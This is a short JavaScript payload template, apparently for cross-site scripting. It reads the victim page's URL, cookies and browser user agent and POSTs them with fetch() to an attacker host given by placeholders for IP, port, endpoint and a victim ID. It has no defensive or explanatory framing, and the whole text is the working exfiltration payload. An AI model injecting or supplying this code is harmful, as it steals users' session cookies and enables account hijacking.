// not tested
u = "http://{{IP}}:{{PORT}}{{INFO_ENDPOINT}}/{{UID}}";
//console.log(window.location.href);
//console.log(document.cookie);
j = {url: window.location.href,
    cookie: document.cookie,
    user_agent: window.navigator.userAgent
};
fetch(u, {
    method: "POST",
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(j)
});
